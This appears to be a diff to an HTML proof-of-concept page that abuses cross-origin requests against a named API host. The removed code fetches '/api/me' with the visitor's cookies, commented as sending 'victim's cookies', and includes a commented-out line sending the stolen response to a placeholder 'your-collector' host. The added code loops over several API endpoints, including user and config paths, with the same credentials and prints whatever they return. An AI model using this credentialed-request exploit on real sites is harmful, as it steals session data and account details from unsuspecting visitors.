@@ -8,21 +8,25 @@
     <pre id="output">Loading...</pre>
 
     <script>
-        const target = 'https://cewrs-scrap-api.aii.et/api/me';
-        const output = document.getElementById('output');
+const base = 'https://cewrs-scrap-api.aii.et';
+const paths = ['/api/health', '/api/status', '/api/me', '/api/user', '/api/config']; // Add more
+const out = document.getElementById('output');
 
-        fetch(target, {
-            credentials: 'include'  // sends victim's cookies
-        })
-        .then(r => r.text())
-        .then(data => {
-            output.textContent = data;
-            // Optional: exfiltrate to your own listener
-            // fetch('https://your-collector/collect?data=' + encodeURIComponent(data));
-        })
-        .catch(err => {
-            output.textContent = 'Error: ' + err.message;
-        });
-    </script>
+(async () => {
+  for (const p of paths) {
+    try {
+      const r = await fetch(base + p, { credentials: 'include' });
+      const t = await r.text();
+      // Only print if it's not a 404
+      if (r.status !== 404) {
+        out.textContent += `[${r.status}] ${p}\n${t}\n\n`;
+      }
+    } catch (e) {
+      out.textContent += `[ERR] ${p} — ${e.message}\n\n`;
+    }
+  }
+  if (!out.textContent) out.textContent = 'No non-404 endpoints found.';
+})();
+</script>
 </body>
 </html>
